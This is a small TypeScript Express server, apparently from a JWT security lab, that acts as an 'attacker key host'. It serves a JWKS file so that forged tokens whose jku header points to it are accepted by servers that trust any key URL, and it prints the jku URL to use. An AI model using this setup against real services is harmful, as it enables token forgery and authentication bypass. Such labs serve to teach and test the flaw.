import express from 'express';
import * as fs from 'fs';
import * as path from 'path';

const app = express();
const port = process.env.PORT || 3006;
const JWKS_PATH = path.join(__dirname, '..', 'keys', 'jwks.json');

// This is the entire "attack infrastructure": a JSON file, served over HTTP.
// Any server that fetches a jku URL without checking whether it's allowed to
// trust that host will happily come here and pick up whatever key we put in it.
app.get('/.well-known/jwks.json', (req, res) => {
  if (!fs.existsSync(JWKS_PATH)) {
    return res.status(404).json({ error: 'No keys generated yet - run `npm run generate-keys` first.' });
  }
  res.sendFile(JWKS_PATH);
});

app.get('/', (req, res) => {
  res.send('Attacker-controlled key host. Keys served at /.well-known/jwks.json');
});

app.listen(port, () => {
  console.log(`Attacker key host listening on port ${port}`);
  console.log(`jku URL to use in a forged token: http://localhost:${port}/.well-known/jwks.json`);
});
